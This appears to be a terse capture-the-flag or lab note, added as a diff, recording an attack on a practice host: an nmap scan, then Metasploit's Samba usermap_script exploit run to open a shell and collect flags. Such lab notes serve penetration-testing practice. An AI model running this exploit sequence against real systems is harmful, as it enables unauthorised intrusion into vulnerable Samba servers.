@@ -1,0 +1,11 @@
+nmap -T4 -A --top-ports 500 -oN nmap.txt 10.10.10.3
+# google netbios-ssn Samba smbd 3.X - 4.X
+msfconsole
+search usermap
+use multi/samba/usermap_script
+options
+set rhosts 10.10.10.3
+run
+# shell!
+shell
+# got flags
